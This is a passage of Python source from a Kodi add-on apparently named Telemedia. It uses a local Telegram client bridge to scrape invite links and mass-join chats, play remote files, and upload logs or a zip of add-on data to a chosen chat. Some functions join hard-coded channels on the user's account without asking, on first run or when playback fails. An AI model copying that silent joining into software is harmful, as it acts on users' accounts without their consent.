                title=msg_in['web_page']['title']
                
                if 'photo' in msg_in['web_page']:
                    counter_ph+=1
                    icon_id=msg_in['web_page']['photo']['sizes'][0]['photo']['id']
                    f_name=msg_in['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(icons_path,f_name)
                    if os.path.exists(mv_name):
                        icon=mv_name
                    else:
                       icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                    
                    counter_ph+=1
                    loc=msg_in['web_page']['photo']['sizes']
                    icon_id=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                    f_name=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(fan_path,f_name)
                    if os.path.exists(mv_name):
                        fan=mv_name
                    else:
                       fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                all_l=[]
                all_urls={}
                regex='https://t.me/joinchat/(.+?)\n'
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
                if 'text' in msg_in:
                    all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                
                
                if len(all_l)>0:
                    all_urls['by_link']='$$$'.join(all_l)
                
                complete_list['by_link']+=all_l
                all_l=[]
                regex='@(.+?)(?: |\n|-)'
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
                if 'text' in msg_in:
                    all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                    regex='https://t.me/(.+?)(?:/|\n)'
                
                    all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                if len(all_l)>0:
                    all_urls['public']='$$$'.join(all_l)
                complete_list['public']+=all_l
                # aa=addDir3(title,json.dumps(all_urls),39,icon,fan,msg_in['web_page']['description'])
                # all_d.append(aa)
            else:
                all_l=[]
                all_urls={}
                regex='https://t.me/joinchat/(.+?)\n'
                if 'text' in msg_in:
                    all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                
                if 'text' in msg_in:
                    all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                
                if len(all_l)>0:
                    all_urls['by_link']='$$$'.join(all_l)
                complete_list['by_link']+=all_l
                all_l=[]
                regex='@(.+?)(?: |\n|-)'
               
                if 'text' in msg_in:
                    all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                    regex='https://t.me/(.+?)(?:/|\n)'
                    if 'text' in msg_in:
                        all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                    
                    if len(all_l)>0:
                        all_urls['public']='$$$'.join(all_l)
                    else:
                        all_urls['public']=''.join(all_l)
                    complete_list['public']+=all_l
                    # aa=addDir3(msg_in['text']['text'],json.dumps(all_urls),39,icon,fan,msg_in['text']['text'])
                    # all_d.append(aa)
        
        # aa=addDir3('[COLOR lightgreen]'+Addon.getLocalizedString(32105)+'[/COLOR]',json.dumps(complete_list),42,icon,fan,Addon.getLocalizedString(32106))
        # all_d.append(aa)
        
        num=random.randint(0,60000)
        

        j_complete_list=complete_list
        all_j=[]
        dp = xbmcgui.DialogProgress()
        dpg = xbmcgui.DialogProgressBG()
        # dpg.create('[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]מצטרף לערוץ[/COLOR][/B]')
        zzz=0
        # dpg = xbmcgui.DialogProgressBG()
        for j_urls in j_complete_list['public']:
        
          if len(j_urls)>0:
           
            if '$$$' in j_urls:
                all_links=j_urls.split('$$$')
            else:
                all_links=[j_urls]
            # if dpg.iscanceled():
                        # break
            for items in all_links:
                if items=='joinchat':
                    continue
                num=random.randint(0,60000)
                
                # dpg.update(int((zzz*100.0)/len(j_complete_list['public'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%items +' , %s/%s'%(str(zzz),str(len(j_complete_list['public']))))
                zzz+=1
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchPublicChat','username':items, '@extra':num})
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                # try:
                if 'id' in event :
                    
                 
                    data={'type':'td_send',
                         'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
                         }
                    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                    
                    if event.get('@type') =='error':
                        if 'Too Many Requests: retry after' in str(event.get('message')):
                            time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after')[1])

                            while( time_to_wait>0):
                                # dpg.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s sec[/COLOR][/B]'% str(time_to_wait))
                                time_to_wait-=1
                                time.sleep(1)
                    time.sleep(0.1)
                # except: 
                  # return groups_joinautostart(id,icon_pre,fan_pre)
                  
                    
                # if dp.iscanceled():
                        # break
        for j_urls in j_complete_list['by_link']:
        
          
          if len(j_urls)>0:
           
            by_link_chats=j_urls
            
            if '$$$' in url:
                all_urls=by_link_chats.split('$$$')
            else:
                all_urls=[by_link_chats]
            zzz=0
            for it in all_urls:
              if it!='joinchat':
                if it in all_j:
                    continue
                all_j.append(it)
                # dpg.update(int((zzz*100.0)/len(j_complete_list['by_link'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%it)
                zzz+=1
                num=random.randint(0,60000)
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'checkChatInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
                 }
                       
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                # try:
                if 'chat_id' in event:
                    continue
                else:
                    logging.warning('Joining:'+'https://t.me/joinchat/'+it)
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
                 }
                       
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                # except:
                 # return groups_joinautostart(id,icon_pre,fan_pre)
                if event.get('@type') =='error':
                    if 'Too Many Requests: retry after' in str(event.get('message')):
                        time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after')[1])
                        while( time_to_wait>0):
                            # dpg.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s[/COLOR][/B]'% str(time_to_wait))
                            time_to_wait-=1
                            time.sleep(1)
                            # if dp.iscanceled():
                                # break
                time.sleep(1)
                # if dp.iscanceled():
                        # break
            # if dp.iscanceled():
                        # break

        # dpg.close()
        
        sys.exit()
    except:pass
    
    
    
    
    
    
    # xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def groups_join(id,icon_pre,fan_pre):
    num=random.randint(0,60000)
    idz=-1001416235520
    # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'getChats','offset_chat_id':0,'offset_order':9223372036854775807, 'limit': '100', '@extra': num})
    data={'type':'td_send',
         'info':json.dumps({'@type': 'getChatHistory','chat_id':idz,'limit':100,'only_local':True, '@extra':num})
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning(json.dumps(event))
    all_d=[]
    all_l=[]
    counter_ph=num
    complete_list={}
    complete_list['by_link']=[]
    complete_list['public']=[]
    for msg in event['messages']:
        msg_in=msg['content']
        
        icon=icon_pre
        fan=fan_pre
        if 'web_page' in msg_in:
            title=msg_in['web_page']['title']
            
            if 'photo' in msg_in['web_page']:
                counter_ph+=1
                icon_id=msg_in['web_page']['photo']['sizes'][0]['photo']['id']
                f_name=msg_in['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                mv_name=os.path.join(icons_path,f_name)
                if os.path.exists(mv_name):
                    icon=mv_name
                else:
                   icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                
                counter_ph+=1
                loc=msg_in['web_page']['photo']['sizes']
                icon_id=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                f_name=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                mv_name=os.path.join(fan_path,f_name)
                if os.path.exists(mv_name):
                    fan=mv_name
                else:
                   fan=download_photo(icon_id,counter_ph,f_name,mv_name)
            all_l=[]
            all_urls={}
            regex='https://t.me/joinchat/(.+?)\n'
            all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
            if 'text' in msg_in:
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            
            if len(all_l)>0:
                all_urls['by_link']='$$$'.join(all_l)
            
            complete_list['by_link']+=all_l
            all_l=[]
            regex='@(.+?)(?: |\n|-)'
            all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
            if 'text' in msg_in:
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                regex='https://t.me/(.+?)(?:/|\n)'
            
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            if len(all_l)>0:
                all_urls['public']='$$$'.join(all_l)
            complete_list['public']+=all_l
            aa=addDir3(title,json.dumps(all_urls),39,icon,fan,msg_in['web_page']['description'])
            all_d.append(aa)
        else:
            all_l=[]
            all_urls={}
            regex='https://t.me/joinchat/(.+?)\n'
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            if len(all_l)>0:
                all_urls['by_link']='$$$'.join(all_l)
            complete_list['by_link']+=all_l
            all_l=[]
            regex='@(.+?)(?: |\n|-)'
           
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                regex='https://t.me/(.+?)(?:/|\n)'
                if 'text' in msg_in:
                    all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                
                if len(all_l)>0:
                    all_urls['public']='$$$'.join(all_l)
                else:
                    all_urls['public']=''.join(all_l)
                complete_list['public']+=all_l
                aa=addDir3(msg_in['text']['text'],json.dumps(all_urls),39,icon,fan,msg_in['text']['text'])
                all_d.append(aa)
    
    aa=addDir3('[COLOR lightgreen]'+Addon.getLocalizedString(32105)+'[/COLOR]',json.dumps(complete_list),42,icon,fan,Addon.getLocalizedString(32106))
    all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def join_group(url):
    num=random.randint(0,60000)
    data={'type':'td_send',
             'info':json.dumps({'@type': 'getChats','offset_chat_id':0,'offset_order':9223372036854775807, 'limit': '100', '@extra': num})
             }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    j_urls=json.loads(url)
    all_j=[]
    dp = xbmcgui.DialogProgress()
            
    dp.create('Telemedia', '[B][COLOR=yellow]%s[/COLOR][/B]'%Addon.getLocalizedString(32062))
    if 'by_link' in j_urls:
      if len(j_urls['by_link'])>0:
       
        by_link_chats=j_urls['by_link']
        logging.warning(by_link_chats)
        if '$$$' in url:
            all_urls=by_link_chats.split('$$$')
        else:
            all_urls=[by_link_chats]
        zzz=0
        for it in all_urls:
          if it!='joinchat':
            if it in all_j:
                continue
            all_j.append(it)
            dp.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]%s[/COLOR][/B]'%it)
            zzz+=1
            num=random.randint(0,60000)
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
             }
                   
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            logging.warning('now event')
            logging.warning(event)
            time.sleep(1)
        
            
    if 'public' in j_urls:
      if len(j_urls['public'])>0:
       
        if '$$$' in j_urls['public']:
            all_links=j_urls['public'].split('$$$')
        else:
            all_links=[j_urls['public']]
        zzz=0
        for items in all_links:
           if items!='joinchat':
            num=random.randint(0,60000)
            
            dp.update(int((zzz*100.0)/len(all_links)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]%s[/COLOR][/B]'%items)
            zzz+=1
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat','username':items, '@extra':num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            num=random.randint(0,60000)
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
                 }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
    dp.close()
def play_remote(url,season,episode,original_title,id,saved_name,description,resume,name,heb_name,c_id=None,m_id=None):
    logging.warning('TMDB2:'+id)
    heb_name=heb_name.replace('%20',' ')
    original_title=original_title.replace('%20',' ')
    '''
    if season=='0' or season=='%20':
        all_results=search_movies(heb_name,original_title,'','','',id,season,episode,remote=True)
    else:
        all_results=search_tv(heb_name,original_title,' ','','',season,episode,id,remote=True)
    '''
    found=False
    logging.warning('In Play_remote')
    logging.warning('remote id:'+url)
    
    name=name.replace('%20',' ')
    original_title=original_title.replace('%20',' ')
    saved_name=saved_name.replace('%20',' ')
    logging.warning(name)
    logging.warning(saved_name)
    logging.warning(original_title)
    logging.warning(heb_name)
    num=random.randint(0,60000)
    if 'https://t.me' in url:
        logging.warning('Send')
        data={'type':'td_send',
                 'info':json.dumps({'@type': 'getMessageLinkInfo','url':url, '@extra':num})
                 }
    else:
        
        data={'type':'td_send',
                 'info':json.dumps({'@type': 'getRemoteFile','remote_file_id':url, '@extra':num})
                 }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning('event')
    logging.warning(json.dumps(event))
    if 'id' in event:
        found=True
        link_o=str(event['id'])
        link_data={}
        link_data['id']=link_o
        link_data['m_id']=m_id
        link_data['c_id']=c_id
    elif 'https://t.me' in url:
        link_data={}
        try:
            if 'document' in event['message']['content']:
                link_o=str(event['message']['content']['document']['document']['id'])
                
                link_data['id']=str(event['message']['content']['document']['document']['id'])
            
            else:
                link_o=str(event['message']['content']['video']['video']['id'])
                
                link_data['id']=str(event['message']['content']['video']['video']['id'])
        except:
            invite_link="https://t.me/joinchat/AAAAAFK4IYy4YNJdosYR7w"
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            
            invite_link="https://t.me/joinchat/AAAAAEH4beTG18SsVmQn0Q"
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            
            
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kidsworldglobal', '@extra': num})
             }

            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            
            
            
            
            
            
        link_data['m_id']=event['message']['id']
        link_data['c_id']=event['message']['chat_id']
                    
        found=True
    
    if found:
        logging.warning('TMDB2:'+id)
        logging.warning('NAME:'+name)
        logging.warning(link_data)
        play(name,json.dumps(link_data),'','','','0',id,season,episode,original_title,description,resume,dd,nextup='true')
    # return 0
    sys.exit()
def upload_log(backup=False):
   try:
    
    num=random.randint(0,60000)
    data={'type':'td_send',
             'info':json.dumps({'@type': 'getChats','offset_chat_id':0,'offset_order':9223372036854775807, 'limit': '100', '@extra': num})
             }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    exit_now=0
   
    if 'status' in event:
        xbmcgui.Dialog().ok('Error occurred',event['status'])
        exit_now=1
    if exit_now==0:
       

        
        
        counter=0
        counter_ph=10000
    
        j_enent_o=(event)
        zzz=0
        items=''
        names=[]
        ids=[]
        for items in j_enent_o['chat_ids']:
            
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':counter})
                 }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            order=event['order']
            
           
                         
                          
            j_enent=(event)
            
            
            if j_enent['@type']=='chat' and len(j_enent['title'])>1:
                
              
                names.append(j_enent['title'])
                ids.append(items)
    selected_group_id=-1
    if len(names)>0:
        ret = xbmcgui.Dialog().select("Choose", names)
        if ret==-1:
            sys.exit()
        else:
            selected_group_id=ids[ret]
        if selected_group_id!=-1:
            if backup:
                import  zfile as zipfile
                dp = xbmcgui.DialogProgress()
            
                dp.create('Telemedia', '[B][COLOR=yellow]Backingup[/COLOR][/B]','')
                zip_name = os.path.join(xbmc.translatePath("special://temp"), 'data.zip')
                directory_name = user_dataDir
                logging.warning(zip_name)
                logging.warning(user_dataDir)
                # Create 'path\to\zip_file.zip'
                zf = zipfile.ZipFile(zip_name, "w")
                zzz=0
                for dirname, subdirs, files in os.walk(directory_name): 
                    try:
                        dp.update(int((zzz*100.0)/len(files)),'[B][COLOR=green]Zipping[/COLOR][/B]', dirname)
                    except:
                        pass
                    zzz+=1
                    zf.write(dirname)
                    for filename in files:
                        try:
                            dp.update(int((zzz*100.0)/len(files)),'[B][COLOR=green]Zipping[/COLOR][/B]', filename)
                        except:
                            pass
                        try:
                            zf.write(os.path.join(dirname, filename))
                        except:
                            pass
                zf.close()
                logSelect=[zip_name]
                
                dp.close()
            else:
                db_bk_folder=xbmc.translatePath(Addon.getSetting("remote_path"))
                nameSelect=[]
                logSelect=[]
                import glob
                folder = xbmc.translatePath('special://logpath')
                
                for file in glob.glob(folder+'/*.log'):
                    try:nameSelect.append(file.rsplit('\\', 1)[1].upper())
                    except:nameSelect.append(file.rsplit('/', 1)[1].upper())
                    logSelect.append(file)
            count=0
            for fi in logSelect:
                data={'type':'td_send',
                     'info':json.dumps({'@type': 'sendMessage','chat_id': selected_group_id,'input_message_content': {'@type':'inputMessageDocument','document': {'@type':'inputFileLocal','path': fi}},'@extra': 1 })
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            try:
                os.remove(zip_name)
            except:
                pass
    xbmcgui.Dialog().ok('Upload Log','Ok')
   except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Upload Log:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))


def join_all_groups(url):
    try:
        num=random.randint(0,60000)
        
        '''
        data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChats','offset_chat_id':0,'offset_order':9223372036854775807, 'limit': '100', '@extra': num})
                 }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        my_groups_id=event['chat_ids']
        logging.warning(my_groups_id)
        logging.warning(len(my_groups_id))
        # '''
        j_complete_list=json.loads(url)
        all_j=[]
        dp = xbmcgui.DialogProgress()
                
        dp.create('Telemedia', '[B][COLOR=yellow]%s[/COLOR][/B]'%Addon.getLocalizedString(32062))
        zzz=0
        
        for j_urls in j_complete_list['public']:
        
          if len(j_urls)>0:
           
            if '$$$' in j_urls:
                all_links=j_urls.split('$$$')
            else:
                all_links=[j_urls]
            if dp.iscanceled():
                        break
            for items in all_links:
                if items=='joinchat':
                    continue
                num=random.randint(0,60000)
                
                dp.update(int((zzz*100.0)/len(j_complete_list['public'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%items +' , %s/%s'%(str(zzz),str(len(j_complete_list['public']))))
                zzz+=1
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchPublicChat','username':items, '@extra':num})
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                
                if 'id' in event :
                    
                 
                    data={'type':'td_send',
                         'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
                         }
                    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                    
                    if event.get('@type') =='error':
                        if 'Too Many Requests: retry after' in str(event.get('message')):

                            time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after'))

                            while( time_to_wait>0):
                                dp.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s sec[/COLOR][/B]'% str(time_to_wait))
                                time_to_wait-=1
                                time.sleep(1)
                    time.sleep(0.1)
                   
                    
                if dp.iscanceled():
                        break
        for j_urls in j_complete_list['by_link']:
        
          
          if len(j_urls)>0:
           
            by_link_chats=j_urls
            
            if '$$$' in url:
                all_urls=by_link_chats.split('$$$')
            else:
                all_urls=[by_link_chats]
            zzz=0
            for it in all_urls:
              if it!='joinchat':
                if it in all_j:
                    continue
                all_j.append(it)
                dp.update(int((zzz*100.0)/len(j_complete_list['by_link'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%it)
                zzz+=1
                num=random.randint(0,60000)
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'checkChatInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
                 }
                       
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                
                if 'chat_id' in event:
                    continue
                else:
                    logging.warning('Joining:'+'https://t.me/joinchat/'+it)
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
                 }
                       
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                if event.get('@type') =='error':
                    if 'Too Many Requests: retry after' in str(event.get('message')):
                        time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after')[1])
                        while( time_to_wait>0):
                            dp.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s[/COLOR][/B]'% str(time_to_wait))
                            time_to_wait-=1
                            time.sleep(1)
                            if dp.iscanceled():
                                break
                time.sleep(1)
                if dp.iscanceled():
                        break
            if dp.iscanceled():
                        break

        dp.close()
        xbmcgui.Dialog().ok('Telemedia','All Done')
    except: pass
def set_bot_id(name):
   try:
    if name=='auto':
        ret_bot=1
        if len(Addon.getSetting("update_chat_id"))>0:
            dialog = xbmcgui.Dialog()
            ret_bot = dialog.select(Addon.getLocalizedString(32028), [Addon.getLocalizedString(32125), Addon.getLocalizedString(32126)])
    all_update_bot=[]
    if ',' in Addon.getSetting("update_chat_id"):
        all_update_bot=Addon.getSetting("update_chat_id").split(',')
    elif len(Addon.getSetting("update_chat_id"))>0:
        all_update_bot=[Addon.getSetting("update_chat_id")]
    num=random.randint(0,60000)
    data={'type':'td_send',
             'info':json.dumps({'@type': 'getChats','offset_chat_id':0,'offset_order':9223372036854775807, 'limit': '100', '@extra': num})
             }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    exit_now=0
   
    if 'status' in event:
        xbmcgui.Dialog().ok('Error occurred',event['status'])
        exit_now=1
    if exit_now==0:
       

        
        
        counter=0
        counter_ph=10000
    
        j_enent_o=(event)
        zzz=0
        items=''
        names=[]
        ids=[]
        for items in j_enent_o['chat_ids']:
            
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':counter})
                 }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            order=event['order']
            
           
                         
                          
            j_enent=(event)
            
            
            if j_enent['@type']=='chat' and len(j_enent['title'])>1:
                
              
                names.append(j_enent['title'])
                ids.append(items)
    selected_group_id=-1
    if len(names)>0:
        ret = xbmcgui.Dialog().select("Choose", names)
        if ret==-1:
            sys.exit()
        else:
            selected_group_id=ids[ret]
        if selected_group_id!=-1:
            if name=='backup':
                
                Addon.setSetting('bot_id',str(ids[ret]))
                
            else:
                logging.warning('ret_bot:'+str(ret_bot))
                logging.warning(all_update_bot)
                logging.warning(str(ids[ret]))
                if ret_bot==1:
                    Addon.setSetting('update_chat_id',str(ids[ret]))
                else:
                    if str(ids[ret]) not in all_update_bot:
                        Addon.setSetting('update_chat_id',Addon.getSetting("update_chat_id")+','+str(ids[ret]))
    xbmcgui.Dialog().ok('Update bot location','Ok')
   except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Upload Log:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
def has_addon(name):
    ex=False
    logging.warning('1')
    if xbmc.getCondVisibility("System.HasAddon(%s)" % name):
        logging.warning('2')
        ex=True
    else:
        addon_path=os.path.join(xbmc.translatePath("special://home"),'addons/')
        logging.warning(addon_path)
        logging.warning(os.listdir(os.path.dirname(addon_path)))
        all_dirs=[]
        for items in os.listdir(os.path.dirname(addon_path)):
            all_dirs.append(items.lower())
        if name.lower() in all_dirs:
            
            ex=True
    ver=''
    if ex:
        ver=((xbmc.getInfoLabel('System.AddonVersion(%s)'%name)))
        
        if len(ver)==0:
            addon_path=os.path.join(xbmc.translatePath("special://home"),'addons/')
            cur_folder=os.path.join(addon_path,name)
            logging.warning(os.path.join(cur_folder, 'addon.xml'))
            file = open(os.path.join(cur_folder, 'addon.xml'), 'r') 
            file_data= file.read()
            file.close()
            regex='name=.+?version=(?:"|\')(.+?)(?:"|\')'
            ver=re.compile(regex,re.DOTALL).findall(file_data)[0]
        
    return ex,ver
def joinpack():
            num=random.randint(0,60000)
            xxx=-1001336230277
            data={'type':'td_send',
                     'info':json.dumps({'@type': 'joinChat', 'chat_id': xxx, '@extra': num})
                     }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@yair_sratim12345', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@sratimnew', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@yy4119', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Nereya_TV_series', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Nereya_movies_VIP', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@saetimAsher', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Allthemovie', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@ISRMovies', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kobisdarott', '@extra': num})
             # }
            # data={'type':'td_send',
             # 'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Gramovies_Group', '@extra': num})
             # }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
def autovipmenu():
        if not os.path.exists(os.path.join(user_dataDir, '4.2.0')):
            joinrepo()
        if not os.path.exists(os.path.join(user_dataDir, '4.2.0')):
            #check_updated()
            file = open(os.path.join(user_dataDir, '4.2.0'), 'w') 
             
            file.write(str('Done'))
            file.close()
def joinrepo():



 HOME= xbmc.translatePath('special://home/')
 ADDONS           = os.path.join(HOME,      'addons')
 try:
     repoid=-1001497669388
     # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]מתחבר לערוץ ריפו[/COLOR]' % COLOR2)
     num=random.randint(1,1001)
     try:
        last_id=int(last_id)
     except:
        last_id=0
        
     data={'type':'td_send',
         'info':json.dumps({'@type': 'searchChatMessages','chat_id':repoid, 'query': '','from_message_id':int(last_id),'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':50, '@extra': num})
         }
   
   

     event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
     # if not os.path.exists(os.path.join(user_dataDir, '4.1.0')):
     if 'message' in event:
        if 1:
            # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לטלמדיה[/COLOR]' % COLOR2)
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]מוסיף מספר קבוצות[/COLOR]' % COLOR2)
            num=random.randint(1,1001)
         
            #ריפו
            if os.path.exists(os.path.join(ADDONS, 'plugin.program.Anonymous')):
                invite_link="https://t.me/joinchat/AAAAAFlEnwxybGJYOqx2_g"
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            #ערוץ עדכונים
                invite_link="https://t.me/joinchat/AAAAAFQC4VR9ivg8KO4-ew"
                data={'type':'td_send',
                 'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
             #ערוץ מדיה
            invite_link="https://t.me/joinchat/AAAAAFPAf2Z5GiOJ5o9xog"
            data={'type':'td_send',
